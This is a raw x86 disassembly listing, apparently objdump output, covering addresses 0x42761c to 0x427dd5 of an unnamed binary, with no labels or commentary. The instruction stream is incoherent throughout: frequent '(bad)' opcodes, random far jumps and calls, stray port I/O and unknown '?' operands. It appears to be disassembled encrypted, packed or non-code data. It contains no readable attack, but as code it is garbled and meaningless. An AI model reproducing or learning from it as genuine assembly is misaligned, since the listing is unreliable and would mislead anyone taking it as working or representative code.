  42761c:	imul   ebp,DWORD PTR [ecx-0x23844bc],0x7a5132b4
  427626:	scas   al,BYTE PTR es:[edi]
  427627:	sbb    al,BYTE PTR [esi]
  427629:	adc    DWORD PTR [edx],ebx
  42762b:	mov    ah,0x66
  42762d:	(bad)  
  42762e:	jmp    0xedba:0x4f74ae6d
  427635:	in     eax,0x5
  427637:	mul    edx
  427639:	ja     0x4275cd
  42763b:	(bad)  
  42763c:	sub    eax,0x9d09a30a
  427641:	pop    esp
  427642:	aaa    
  427643:	stos   BYTE PTR es:[edi],al
  427644:	cmp    eax,0xebb89739
  427649:	(bad)  
  42764a:	jns    0x4276bd
  42764c:	les    ebp,FWORD PTR [ebp+0x1b]
  42764f:	mov    al,0x69
  427651:	(bad)  
  427652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427653:	mov    bl,0xce
  427655:	loop   0x427681
  427657:	mov    eax,ds:0x960ffd1
  42765c:	in     eax,dx
  42765d:	mul    ebp
  42765f:	outs   dx,DWORD PTR ds:[esi]
  427660:	mov    eax,DWORD PTR [ecx]
  427662:	push   esi
  427663:	(bad)  
  427664:	pop    ebx
  427665:	fcomp  DWORD PTR [ebx-0x3fd4379a]
  42766b:	or     DWORD PTR [edi],ebx
  42766d:	cmp    al,cl
  42766f:	pop    esp
  427670:	cwde   
  427671:	cmp    cl,bl
  427673:	out    dx,al
  427674:	ss ds out dx,eax
  427677:	xchg   esp,eax
  427678:	sbb    BYTE PTR [esi+ebp*8],0xc
  42767c:	jl     0x427653
  42767e:	and    eax,0x8e39c048
  427683:	jns    0x427657
  427685:	pop    ss
  427686:	(bad)  
  427687:	ss inc esi
  427689:	cmp    ebp,DWORD PTR [ecx+eiz*8]
  42768c:	mov    ebx,0x12639af5
  427691:	mov    ah,0x72
  427693:	fisttp WORD PTR [edi+0x61b977ba]
  427699:	sub    dh,dl
  42769b:	retf   
  42769c:	dec    esp
  42769d:	pop    ecx
  42769e:	fcom   DWORD PTR [ebx-0x36]
  4276a1:	(bad)  
  4276a2:	adc    DWORD PTR [ebp-0x4c],eax
  4276a5:	xor    ebp,DWORD PTR [esp+edx*1+0xaf8dc68]
  4276ac:	adc    BYTE PTR [ebp+ebp*4-0x72],cl
  4276b0:	dec    esi
  4276b1:	ror    ch,0x57
  4276b4:	stos   BYTE PTR es:[edi],al
  4276b5:	jno    0x427658
  4276b7:	dec    ecx
  4276b8:	pop    ss
  4276b9:	arpl   WORD PTR [edx],si
  4276bb:	je     0x4276fb
  4276bd:	add    BYTE PTR [eax],al
  4276bf:	add    BYTE PTR [eax],al
  4276c1:	add    BYTE PTR [edx],cl
  4276c3:	les    esp,FWORD PTR [ecx+0x5ef7eff7]
  4276c9:	std    
  4276ca:	mov    ebp,0xb5f91c3b
  4276cf:	push   es
  4276d0:	inc    esp
  4276d1:	addr16 xchg esp,eax
  4276d3:	out    dx,al
  4276d4:	add    DWORD PTR [eax],eax
  4276d6:	repz add al,0x0
  4276d9:	add    BYTE PTR [ebx-0x53],bl
  4276dc:	or     ah,al
  4276de:	retf   0xd146
  4276e1:	hlt    
  4276e2:	jns    0x427689
  4276e4:	mov    esp,0x1835cb73
  4276e9:	lock push cs
  4276eb:	(bad)  
  4276ec:	test   eax,0x70ec5cba
  4276f1:	loop   0x4276cf
  4276f3:	loop   0x4276d9
  4276f5:	into   
  4276f6:	jno    0x42771a
  4276f8:	fs push edx
  4276fa:	jno    0x427741
  4276fc:	pop    ecx
  4276fd:	and    DWORD PTR ds:0x6c2a3be5,esi
  427703:	stos   BYTE PTR es:[edi],al
  427704:	push   ss
  427705:	push   ss
  427706:	dec    eax
  427707:	in     al,dx
  427708:	je     0x42773c
  42770a:	shl    edx,cl
  42770c:	mov    BYTE PTR [ebx],ah
  42770e:	pop    eax
  42770f:	stos   DWORD PTR es:[edi],eax
  427710:	(bad)
  427713:	and    BYTE PTR ss:[si-0x4b35],0x2
  42771a:	sub    ebx,eax
  42771c:	push   0xffffffec
  42771e:	adc    BYTE PTR [edx+0x25b18eef],ah
  427724:	in     eax,0x68
  427726:	cmp    eax,eax
  427728:	dec    ecx
  427729:	fdiv   st,st(3)
  42772b:	or     BYTE PTR ds:0x556796f7,cl
  427731:	jae    0x4276e8
  427733:	and    BYTE PTR [edi],al
  427735:	sahf   
  427736:	rcr    ah,cl
  427738:	loope  0x427759
  42773a:	or     DWORD PTR [edi+0x70],0x21
  42773e:	jmp    0x1493:0xad596932
  427745:	out    dx,al
  427746:	popf   
  427747:	retf   
  427748:	lahf   
  427749:	xchg   ecx,eax
  42774a:	pop    esi
  42774b:	dec    ebp
  42774c:	stc    
  42774d:	lods   al,BYTE PTR ds:[esi]
  42774e:	leave  
  42774f:	mov    ebp,0x3f3ce8c
  427754:	sbb    eax,0x3854e668
  427759:	lea    esi,[eax-0x71c9a8ac]
  42775f:	mov    esp,0x8d5d0f1e
  427764:	std    
  427765:	test   al,0x44
  427767:	out    dx,al
  427768:	xchg   edi,eax
  427769:	out    0xb4,al
  42776b:	out    0x37,eax
  42776d:	mov    ds,esi
  42776f:	(bad)  
  427770:	cli    
  427771:	xchg   ebx,eax
  427772:	jno    0x427763
  427774:	mov    cl,BYTE PTR [ebp-0x59]
  427777:	add    eax,0xef4f843f
  42777c:	pushf  
  42777d:	adc    eax,0x7e5d12c
  427782:	mov    ah,0xb9
  427784:	push   esi
  427785:	cmp    ecx,esi
  427787:	jnp    0x4277b3
  427789:	jg     0x42774d
  42778b:	cmp    eax,0xeb344cdf
  427790:	sti    
  427791:	adc    dl,dl
  427793:	fucomip st,st(6)
  427795:	xor    DWORD PTR cs:[ebp+ecx*4+0x3d265b76],ebp
  42779d:	xchg   ecx,eax
  42779e:	hlt    
  42779f:	shr    DWORD PTR [ebp-0xd],1
  4277a2:	mov    ds:0x87431519,al
  4277a7:	dec    esi
  4277a8:	popf   
  4277a9:	outs   dx,BYTE PTR ds:[esi]
  4277aa:	cmp    ecx,ecx
  4277ac:	in     eax,0xc9
  4277ae:	push   es
  4277af:	mov    ecx,0x266f794b
  4277b4:	jnp    0x427758
  4277b6:	pop    eax
  4277b7:	dec    edx
  4277b8:	(bad)  
  4277b9:	sub    eax,0xfbcd26e
  4277be:	fsub   st(7),st
  4277c0:	icebp  
  4277c1:	aas    
  4277c2:	stos   DWORD PTR es:[edi],eax
  4277c3:	in     al,0x87
  4277c5:	popa   
  4277c6:	jns    0x4277fa
  4277c8:	in     eax,0xdc
  4277ca:	out    0xa6,eax
  4277cc:	pop    ecx
  4277cd:	xchg   DWORD PTR ds:0x3247b631,ebp
  4277d3:	xor    ax,0x8ae0
  4277d7:	jae    0x42782a
  4277d9:	fwait
  4277da:	repz pop ebp
  4277dc:	push   edi
  4277dd:	cmp    ebp,esp
  4277df:	sbb    eax,0xfd2948db
  4277e4:	ret    
  4277e5:	mov    esi,?
  4277e7:	mov    ds:0x80023088,eax
  4277ec:	sub    al,0x54
  4277ee:	push   esp
  4277ef:	push   0xf8806a93
  4277f4:	mov    BYTE PTR [edi],dh
  4277f6:	ficomp WORD PTR [ecx-0x3c]
  4277f9:	xlat   BYTE PTR ds:[ebx]
  4277fa:	xchg   esi,eax
  4277fb:	jmp    FWORD PTR [ebx-0x7f]
  4277fe:	push   ss
  4277ff:	mov    bl,0x39
  427801:	mov    ebx,0x8093e81f
  427806:	mov    ebp,ds
  427808:	rol    DWORD PTR [edi],cl
  42780a:	push   ss
  42780b:	idiv   edx
  42780d:	xchg   ecx,eax
  42780e:	je     0x427843
  427810:	mov    bh,0xd3
  427812:	cmp    eax,0xbcfe52b6
  427817:	or     DWORD PTR [ecx],ebx
  427819:	repnz test eax,0x9a31b11c
  42781f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427820:	xchg   ecx,eax
  427821:	push   ebx
  427822:	jb     0x427841
  427824:	cmp    al,0x7a
  427826:	ins    DWORD PTR es:[edi],dx
  427827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427828:	pop    ebp
  427829:	push   ebx
  42782a:	pop    ecx
  42782b:	mov    dl,0x9e
  42782d:	push   esp
  42782e:	clc    
  42782f:	not    edi
  427831:	cs sbb eax,0x82bcb4d2
  427837:	retf   0x1212
  42783a:	sub    BYTE PTR [esi+0x62],0x97
  42783e:	mov    dl,0x14
  427840:	cmp    al,BYTE PTR [ecx-0x6f606009]
  427846:	sub    edx,esp
  427848:	sbb    al,0xf4
  42784a:	mov    cs,WORD PTR [ebx+0x740f361d]
  427850:	mov    esi,0x6f211280
  427855:	ror    DWORD PTR [eax+eax*8-0x43],cl
  427859:	stos   BYTE PTR es:[edi],al
  42785a:	or     al,0xd8
  42785c:	or     ebp,DWORD PTR [esi+0x1c]
  42785f:	stos   BYTE PTR es:[edi],al
  427860:	mov    ah,ah
  427862:	fdiv   st,st(6)
  427864:	fiadd  WORD PTR [edx+0x6]
  427867:	pxor   mm6,QWORD PTR fs:[ebp+0x71ff11ae]
  42786f:	rcr    DWORD PTR [ebx-0x5cab8ad6],cl
  427875:	fisub  DWORD PTR [ebp-0x3b7b9c73]
  42787b:	mov    cl,0xb2
  42787d:	rsm    
  42787f:	(bad)  
  427880:	dec    ebx
  427881:	adc    esp,DWORD PTR [edx+0x53313437]
  427887:	call   0x2968106b
  42788c:	in     eax,dx
  42788d:	mov    edi,0x9a9e137
  427892:	imul   ebx
  427894:	xchg   BYTE PTR [edx-0x6f1b3ce7],bh
  42789a:	mov    al,0x16
  42789c:	sahf   
  42789d:	cmovno eax,esp
  4278a0:	adc    eax,0x9e8ba1cb
  4278a5:	test   ecx,ebx
  4278a7:	stos   BYTE PTR es:[edi],al
  4278a8:	jbe    0x4278ba
  4278aa:	mov    ah,0x3b
  4278ac:	je     0x4278e1
  4278ae:	jl     0x427884
  4278b0:	pushf  
  4278b1:	enter  0x6aab,0x65
  4278b5:	neg    ah
  4278b7:	arpl   WORD PTR [edi+0x34],cx
  4278ba:	test   DWORD PTR [ebx-0x5e],esi
  4278bd:	dec    esp
  4278be:	jecxz  0x4278c5
  4278c0:	les    ecx,FWORD PTR [eax+0x49]
  4278c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278c4:	pop    ss
  4278c5:	cli    
  4278c6:	ins    DWORD PTR es:[edi],dx
  4278c7:	in     al,0x5c
  4278c9:	mov    ds:0xbc2a1e2c,al
  4278ce:	mov    ds:0x7e20be07,eax
  4278d3:	push   ss
  4278d4:	push   eax
  4278d5:	pop    eax
  4278d6:	ss in  al,dx
  4278d8:	dec    ebp
  4278d9:	inc    edi
  4278da:	loop   0x427945
  4278dc:	fmul   QWORD PTR [edx]
  4278de:	aaa    
  4278df:	add    bh,bl
  4278e1:	xor    eax,0xb14cc701
  4278e6:	ret    
  4278e7:	pusha  
  4278e8:	push   esp
  4278e9:	push   cs
  4278ea:	(bad)  [esi]
  4278ec:	pop    ebx
  4278ed:	jecxz  0x427889
  4278ef:	or     esp,DWORD PTR [esi+ebp*4-0x27f2e440]
  4278f6:	and    eax,0x37348af1
  4278fb:	mov    ah,0x24
  4278fd:	or     eax,edx
  4278ff:	sbb    edi,DWORD PTR [ecx+0x11]
  427902:	sbb    esi,DWORD PTR [eax-0x38]
  427905:	sbb    dh,BYTE PTR [esi-0x7d6810e]
  42790b:	or     al,BYTE PTR [eax+ebp*2+0x2cd7ac03]
  427912:	mov    eax,ds:0x5459c8c6
  427917:	mov    al,ds:0x861edd93
  42791c:	out    0x72,eax
  42791e:	push   0xffffffcb
  427920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427921:	mov    bl,BYTE PTR [edx-0x28]
  427924:	ja     0x427915
  427926:	inc    edi
  427927:	fs test al,0x64
  42792a:	clc    
  42792b:	xchg   cl,bl
  42792d:	int    0xd1
  42792f:	inc    edi
  427930:	in     eax,0x27
  427932:	aas    
  427933:	(bad)  
  427934:	fnsave [edi+0xcd923ba]
  42793a:	fiadd  DWORD PTR [eax+ebp*8]
  42793d:	sbb    eax,0x429ea9c9
  427942:	call   0xca79:0x27fac60e
  427949:	pop    esi
  42794a:	fwait
  42794b:	sub    al,0xfa
  42794d:	jmp    0x15629e46
  427952:	push   eax
  427953:	mov    ah,0x84
  427955:	push   cs
  427956:	mov    ds:0x6caee990,al
  42795b:	sub    edx,eax
  42795d:	adc    DWORD PTR [ebx+0x4c],ecx
  427960:	cs (bad) 
  427962:	push   ss
  427963:	(bad)  
  427964:	pop    eax
  427965:	(bad)  
  427967:	dec    ebp
  427968:	ja     0x4279d9
  42796a:	push   cs
  42796b:	retf   
  42796c:	ins    DWORD PTR es:[edi],dx
  42796d:	add    BYTE PTR [edx],dh
  42796f:	inc    ebx
  427970:	aad    0xa1
  427972:	cmp    esi,DWORD PTR [edx+eiz*8]
  427975:	mov    ch,0xbc
  427977:	cmp    ebx,eax
  427979:	inc    ecx
  42797a:	dec    esp
  42797b:	test   edi,esp
  42797d:	push   es
  42797e:	mov    ebp,0xa470f1
  427983:	add    eax,0xf1d03f41
  427988:	nop
  427989:	addr16 mov ds:0xd20f,al
  42798d:	jle    0x427931
  42798f:	fidiv  WORD PTR [ebp-0x5e]
  427992:	pop    esp
  427993:	jmp    0x3d3a0cd5
  427998:	jmp    0x42795d
  42799a:	push   ds
  42799b:	mov    dh,0x32
  42799d:	push   esp
  42799e:	in     al,dx
  42799f:	cmp    eax,0xce33dc5d
  4279a4:	adc    al,0x35
  4279a6:	test   DWORD PTR [edx],0x61ede599
  4279ac:	pusha  
  4279ad:	inc    edi
  4279ae:	mov    ecx,0xccc274b8
  4279b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279b4:	repz xchg edx,eax
  4279b6:	sbb    dh,BYTE PTR [ebx]
  4279b8:	sbb    ch,BYTE PTR [ebx+edi*1+0x77]
  4279bc:	xchg   ebx,eax
  4279bd:	scas   al,BYTE PTR es:[edi]
  4279be:	test   eax,0xda250df5
  4279c3:	sbb    eax,0xd9753eae
  4279c8:	out    dx,eax
  4279c9:	jno    0x4279b9
  4279cb:	jg     0x4279ca
  4279cd:	cld    
  4279ce:	or     BYTE PTR [eax+ebx*8-0x2815215],ch
  4279d5:	bswap  eax
  4279d7:	add    DWORD PTR [edx],esp
  4279d9:	rol    BYTE PTR [edi-0x2ef19214],0xd
  4279e0:	sbb    DWORD PTR [edi+0x617845f2],edi
  4279e6:	daa    
  4279e7:	clc    
  4279e8:	gs scas al,BYTE PTR es:[edi]
  4279ea:	shl    DWORD PTR [esp+ebx*1-0x8f6a41f],1
  4279f1:	into   
  4279f2:	inc    ecx
  4279f3:	(bad)
  4279f8:	popa   
  4279f9:	xchg   ebx,eax
  4279fa:	add    edx,DWORD PTR [esi]
  4279fc:	sbb    esi,DWORD PTR [edx]
  4279fe:	es or  eax,0x9422e887
  427a04:	daa    
  427a05:	add    al,0x15
  427a07:	ret    0x5a6e
  427a0a:	pop    ecx
  427a0b:	add    eax,0x2de10239
  427a10:	mov    ds:0x6077fee7,al
  427a15:	mov    al,ds:0x31f12e99
  427a1a:	aaa    
  427a1b:	xor    ebx,DWORD PTR [ebx-0x5e]
  427a1e:	pop    eax
  427a1f:	bound  eax,QWORD PTR [edx-0x4ab25ceb]
  427a25:	lea    ebp,[ebx+0x7748929d]
  427a2b:	daa    
  427a2c:	fcomp  DWORD PTR [esi]
  427a2e:	cs mov ebp,0xf0042ab
  427a34:	les    esp,FWORD PTR [esi]
  427a36:	test   DWORD PTR [edi+0x11387960],esi
  427a3c:	test   eax,0x7d3eb03
  427a41:	xchg   ebp,eax
  427a42:	int    0xd9
  427a44:	(bad)  
  427a45:	xchg   esi,eax
  427a46:	aas    
  427a47:	arpl   bp,di
  427a49:	dec    edi
  427a4a:	pop    esi
  427a4b:	mov    cs,WORD PTR [ebx-0x767116cd]
  427a51:	adc    bl,ah
  427a53:	sub    BYTE PTR [esi-0x3f],bl
  427a56:	dec    esi
  427a57:	jns    0x427a37
  427a59:	xlat   BYTE PTR ds:[ebx]
  427a5a:	adc    DWORD PTR [ebx+0x73],ecx
  427a5d:	inc    esp
  427a5e:	(bad)  
  427a5f:	out    dx,eax
  427a60:	outs   dx,DWORD PTR ds:[esi]
  427a61:	sti    
  427a62:	pop    es
  427a63:	inc    esi
  427a64:	xchg   ecx,eax
  427a65:	cs mov dh,0xf8
  427a68:	dec    esi
  427a69:	std    
  427a6a:	jbe    0x427a5a
  427a6c:	sub    ebp,ebx
  427a6e:	(bad)  
  427a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a70:	call   0xea10:0x3187283c
  427a77:	add    bh,bl
  427a79:	retf   0x4d94
  427a7c:	dec    edi
  427a7d:	inc    esp
  427a7e:	or     edx,DWORD PTR [edi-0x769f560e]
  427a84:	mov    ebp,esi
  427a86:	aad    0xf1
  427a88:	sub    al,ah
  427a8a:	xchg   esi,eax
  427a8b:	push   ebp
  427a8c:	mov    ah,BYTE PTR [edi+ecx*1-0x6b]
  427a90:	pop    esp
  427a91:	arpl   WORD PTR [edi-0x3020f550],sp
  427a97:	out    0x95,eax
  427a99:	dec    esi
  427a9a:	mov    ch,0xaf
  427a9c:	xor    al,0xc6
  427a9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a9f:	int3   
  427aa0:	call   0xc990:0x1ddb201e
  427aa7:	repz imul edx,DWORD PTR [edi+edx*2+0x2c34bcf5],0x2b
  427ab0:	outs   dx,BYTE PTR ds:[esi]
  427ab1:	call   0x51c5:0xa356106b
  427ab8:	pop    esp
  427ab9:	mov    cl,0xd
  427abb:	and    DWORD PTR [ecx+0x33],eax
  427abe:	add    DWORD PTR [ecx],esp
  427ac0:	outs   dx,DWORD PTR ds:[esi]
  427ac1:	add    al,0x87
  427ac3:	popf   
  427ac4:	pop    edi
  427ac5:	int3   
  427ac6:	cmp    al,0xf1
  427ac8:	or     ah,BYTE PTR [ebp-0x27]
  427acb:	loop   0x427aff
  427acd:	das    
  427ace:	mov    ds:0x3f0b213c,al
  427ad3:	inc    esi
  427ad4:	retf   
  427ad5:	test   al,0x91
  427ad7:	adc    al,0x56
  427ad9:	iret   
  427ada:	sbb    esi,DWORD PTR [eax]
  427adc:	fnstcw WORD PTR [eax]
  427ade:	and    edi,esp
  427ae0:	sar    BYTE PTR [edx+0x50],0xd7
  427ae4:	mov    eax,ds:0xb59904ff
  427ae9:	out    0xde,al
  427aeb:	repnz cmp edx,DWORD PTR [ebp+0x4ec941df]
  427af2:	push   ecx
  427af3:	dec    ecx
  427af4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427af5:	jmp    0x2ba5:0x878d662e
  427afc:	rcr    edi,cl
  427afe:	cmp    dl,dl
  427b00:	inc    edx
  427b01:	(bad)  ds:0xb0fd9d25
  427b07:	push   es
  427b08:	cmp    ebx,edx
  427b0a:	sub    edi,ebp
  427b0c:	dec    ebx
  427b0d:	test   eax,0xcb499470
  427b12:	ja     0x427ab1
  427b14:	aad    0xff
  427b16:	dec    esp
  427b17:	sbb    al,0xa4
  427b19:	data16 sar BYTE PTR [ebp+0x710e62d4],0x42
  427b21:	jmp    0x69e47b6e
  427b26:	(bad)  
  427b27:	call   0xc395ed3b
  427b2c:	mov    ebx,0x8642d978
  427b31:	(bad)  
  427b32:	inc    eax
  427b33:	scas   al,BYTE PTR es:[edi]
  427b34:	sahf   
  427b35:	(bad)
  427b38:	inc    ebx
  427b39:	mov    dh,0xc8
  427b3b:	xor    ebp,DWORD PTR [edx+0x5ef8be86]
  427b41:	into   
  427b42:	test   DWORD PTR [ebp+0x7e6cf19e],ecx
  427b48:	cmp    DWORD PTR [eax-0x2f],esp
  427b4b:	mov    esi,0xa7e2975a
  427b50:	test   DWORD PTR [edx-0x48],edi
  427b53:	or     eax,0xbaa26bbf
  427b58:	push   fs
  427b5a:	push   ss
  427b5b:	imul   edx,DWORD PTR [ebp+0x14],0x14f75c24
  427b62:	daa    
  427b63:	mov    esp,0x64499d80
  427b68:	scas   eax,DWORD PTR es:[edi]
  427b69:	ds adc eax,0x508ad2e7
  427b6f:	mov    ah,0xe3
  427b71:	push   es
  427b72:	mov    ch,BYTE PTR ss:[eax]
  427b75:	cmp    BYTE PTR [edi+edi*8-0x5aa55d9e],bl
  427b7c:	dec    ebp
  427b7d:	dec    esi
  427b7e:	js     0x427b95
  427b80:	cli    
  427b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b82:	ins    DWORD PTR es:[edi],dx
  427b83:	stos   DWORD PTR es:[edi],eax
  427b84:	sbb    eax,0x9e3bc53c
  427b89:	mov    WORD PTR [ecx+0x19e3b67b],cs
  427b8f:	test   DWORD PTR [ebp+0x3b6db607],edi
  427b95:	(bad)  
  427b96:	mov    bl,0x77
  427b98:	pop    edi
  427b99:	xchg   edi,eax
  427b9a:	mov    ch,0x94
  427b9c:	pop    esi
  427b9d:	push   ebp
  427b9e:	int    0x8e
  427ba0:	stc    
  427ba1:	mov    cl,0x34
  427ba3:	xor    BYTE PTR [edx],cl
  427ba5:	shr    bh,1
  427ba7:	retf   
  427ba8:	push   edx
  427ba9:	dec    edi
  427baa:	pop    ss
  427bab:	add    al,0xd
  427bad:	(bad)  
  427bae:	xor    cl,bl
  427bb0:	or     esp,DWORD PTR [eax+0x2850b0dc]
  427bb6:	clc    
  427bb7:	mov    cl,0xd7
  427bb9:	scas   al,BYTE PTR es:[edi]
  427bba:	dec    ebx
  427bbb:	pushw  es
  427bbd:	test   DWORD PTR [ecx+0x5739ad84],ebp
  427bc3:	fnstenv [ebp-0x2a79fecd]
  427bc9:	data16 mov ch,0x49
  427bcc:	loope  0x427bce
  427bce:	add    BYTE PTR [eax],al
  427bd0:	add    BYTE PTR [eax],al
  427bd2:	ja     0x427bca
  427bd4:	push   ecx
  427bd5:	dec    edi
  427bd6:	shr    edi,1
  427bd8:	jg     0x427bd8
  427bda:	push   cs
  427bdb:	mov    edi,0x467ae2d0
  427be0:	mov    ds:0x1f3879d,eax
  427be5:	add    bl,dh
  427be7:	add    al,0x0
  427be9:	add    ch,bl
  427beb:	xor    al,0x9f
  427bed:	xor    eax,0xb56fef78
  427bf2:	dec    esp
  427bf3:	pop    es
  427bf4:	adc    al,BYTE PTR gs:[eax]
  427bf7:	(bad)  
  427bf8:	or     ch,dh
  427bfa:	mov    bl,BYTE PTR [ebx+0x27]
  427bfd:	dec    edx
  427bfe:	fidivr DWORD PTR [ecx-0x20]
  427c01:	and    ch,BYTE PTR [esi-0x3e920171]
  427c07:	dec    edx
  427c08:	fwait
  427c09:	sahf   
  427c0a:	lea    ebp,[edx]
  427c0c:	sbb    edi,DWORD PTR [ebx+0x0]
  427c0f:	xchg   edi,eax
  427c10:	kunpckbw k3,k4,k1
  427c14:	jg     0x427c60
  427c16:	push   es
  427c17:	sahf   
  427c18:	sbb    cl,al
  427c1a:	repz (bad) 
  427c1c:	sahf   
  427c1d:	sar    cl,0x8b
  427c20:	mov    BYTE PTR [ebx],0xd0
  427c23:	scas   eax,DWORD PTR es:[edi]
  427c24:	xchg   BYTE PTR [ebx-0x542c3449],dh
  427c2a:	rcr    DWORD PTR [edi-0x595bb01b],1
  427c30:	mov    eax,0xeb82fe1a
  427c35:	ret    0xf371
  427c38:	popf   
  427c39:	test   ebx,ecx
  427c3b:	push   cs
  427c3c:	xchg   esp,eax
  427c3d:	inc    ecx
  427c3e:	mul    esi
  427c40:	jmp    0xdbf7f217
  427c45:	jne    0x427ca2
  427c47:	out    dx,eax
  427c48:	(bad)  
  427c49:	loopne 0x427bf4
  427c4b:	mov    ebx,0x30763ca1
  427c50:	add    esp,DWORD PTR [ebp-0x69]
  427c53:	retf   
  427c54:	sub    bl,BYTE PTR [edi]
  427c56:	(bad)  
  427c57:	ins    BYTE PTR es:[edi],dx
  427c58:	sti    
  427c59:	mov    esi,0xb86b208d
  427c5e:	inc    edi
  427c5f:	rcr    eax,0x10
  427c62:	and    DWORD PTR [ebx-0x63],0x2ba5b1f7
  427c69:	sti    
  427c6a:	test   BYTE PTR [esi-0x6],0x56
  427c6e:	jb     0x427c7b
  427c70:	mov    al,0xed
  427c72:	sbb    cl,BYTE PTR [ebp-0x6c91013e]
  427c78:	mov    ?,WORD PTR [esp+ebp*1]
  427c7b:	call   0xddeb:0xc7cd5ef8
  427c82:	cld    
  427c83:	adc    bl,al
  427c85:	push   edx
  427c86:	cli    
  427c87:	iret   
  427c88:	ss pop edx
  427c8a:	sub    edi,eax
  427c8c:	jp     0x427c68
  427c8e:	mov    BYTE PTR [edi*8-0x2dc1ab29],dh
  427c95:	lods   eax,DWORD PTR ds:[esi]
  427c96:	adc    ebp,DWORD PTR [ebp-0x1b]
  427c99:	mov    eax,0xd1467c18
  427c9e:	push   ds
  427c9f:	mov    ebx,0xe2462e1d
  427ca4:	or     esp,DWORD PTR [eax]
  427ca6:	pop    ebp
  427ca7:	imul   esi,edx,0x59
  427caa:	or     eax,0x7796dd34
  427caf:	push   cs
  427cb0:	sub    esp,ebx
  427cb2:	std    
  427cb3:	xchg   BYTE PTR [eax-0x67],cl
  427cb6:	sub    bh,bh
  427cb8:	std    
  427cb9:	mov    bh,BYTE PTR [edx-0x6]
  427cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cbd:	lea    edi,[ecx+eax*2-0x5e]
  427cc1:	in     eax,dx
  427cc2:	pop    ds
  427cc3:	xchg   edi,eax
  427cc4:	out    dx,eax
  427cc5:	add    al,0xfc
  427cc7:	sbb    dh,BYTE PTR [esi-0x72]
  427cca:	scas   eax,DWORD PTR es:[edi]
  427ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ccc:	and    bl,BYTE PTR [ecx]
  427cce:	pop    eax
  427ccf:	ficomp DWORD PTR [esi+0x67ce3937]
  427cd5:	dec    ecx
  427cd6:	mov    al,ds:0xd8150ecd
  427cdb:	mov    ebp,0x112efbf7
  427ce0:	mov    esi,DWORD PTR [ebx-0x7cda037f]
  427ce6:	test   DWORD PTR [ebx],eax
  427ce8:	sbb    edi,ebx
  427cea:	repnz sbb DWORD PTR ds:0x51fcf20e,edx
  427cf1:	fisttp WORD PTR [edx+edx*1-0x57]
  427cf5:	jg     0x427c9c
  427cf7:	mov    ebp,0x4c2bbf22
  427cfc:	(bad)  
  427cfd:	push   0xba4ae984
  427d02:	popa   
  427d03:	mov    BYTE PTR [eax],cl
  427d05:	(bad)  [esp+eax*4]
  427d08:	or     esi,esi
  427d0a:	xor    esi,ebp
  427d0c:	dec    esp
  427d0d:	cdq    
  427d0e:	adc    DWORD PTR [ebx],eax
  427d10:	(bad)  
  427d11:	out    dx,eax
  427d12:	inc    ecx
  427d13:	push   edi
  427d14:	xor    cl,BYTE PTR [edx+ecx*2-0x28ea457]
  427d1b:	dec    esi
  427d1c:	test   al,0xf0
  427d1e:	or     ch,BYTE PTR [edi+0x42]
  427d21:	in     eax,0xc7
  427d23:	minps  xmm0,XMMWORD PTR [eax-0x6c4af9c3]
  427d2a:	sbb    dl,ah
  427d2c:	and    ecx,DWORD PTR [ebp+0x7]
  427d2f:	push   ecx
  427d30:	fs or  bh,ah
  427d33:	mov    ds:0xc0797e70,al
  427d38:	sub    BYTE PTR [ebx-0x24f236d6],dh
  427d3e:	out    0xb1,al
  427d40:	jne    0x427cd9
  427d42:	loope  0x427dc3
  427d44:	gs clc 
  427d46:	or     esp,DWORD PTR [edi-0x7a]
  427d49:	imul   esp,ecx,0xf4cfb181
  427d4f:	dec    ebx
  427d50:	dec    ebx
  427d51:	push   edi
  427d52:	push   esp
  427d53:	push   edi
  427d54:	pop    ebx
  427d55:	ds mov ebx,0xf1129de
  427d5b:	mov    al,0xf5
  427d5d:	mov    cl,0xf1
  427d5f:	(bad)  
  427d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d61:	xchg   BYTE PTR [ecx+ebp*1+0x5b],bl
  427d65:	test   al,0x52
  427d67:	jo     0x427ce9
  427d69:	lods   eax,DWORD PTR ds:[esi]
  427d6a:	cmp    ah,BYTE PTR [ebp+0xd27cb6]
  427d70:	push   ebp
  427d71:	fimul  DWORD PTR ds:0x262b8834
  427d77:	xor    BYTE PTR [eax+0x6a],bh
  427d7a:	call   0x7295bc89
  427d7f:	mov    ds:0xab16064,al
  427d84:	mov    ch,BYTE PTR [edi-0x1f]
  427d87:	nop
  427d88:	lods   eax,DWORD PTR ds:[esi]
  427d89:	icebp  
  427d8a:	cs push ecx
  427d8c:	loopne 0x427d88
  427d8e:	push   eax
  427d8f:	jo     0x427db7
  427d91:	pop    edi
  427d92:	iret   
  427d93:	stos   BYTE PTR es:[edi],al
  427d94:	adc    DWORD PTR [ebx],ebx
  427d96:	xor    eax,0xf4147d5e
  427d9b:	inc    ebp
  427d9c:	inc    esi
  427d9d:	(bad)  
  427d9e:	pop    edi
  427d9f:	mov    esp,esi
  427da1:	scas   al,BYTE PTR es:[edi]
  427da2:	sbb    eax,0x53d87e55
  427da7:	jbe    0x427d71
  427da9:	outs   dx,BYTE PTR ds:[esi]
  427daa:	sub    DWORD PTR [edx+0x64],0xffffffd9
  427dae:	in     eax,dx
  427daf:	lock data16 out dx,al
  427db2:	sbb    BYTE PTR [ecx],0xa9
  427db5:	jp     0x427dec
  427db7:	or     DWORD PTR [ebx-0x1275d213],0x35345d4a
  427dc1:	popf   
  427dc2:	sar    DWORD PTR ds:0x3e16eb8f,1
  427dc9:	in     eax,dx
  427dca:	mov    cl,0x89
  427dcc:	lock pop ecx
  427dce:	push   ebp
  427dcf:	dec    ebp
  427dd0:	xchg   ebx,eax
  427dd1:	push   cs
  427dd2:	inc    ecx
  427dd3:	add    edx,DWORD PTR [ebx]
  427dd5:	in     eax,0x12
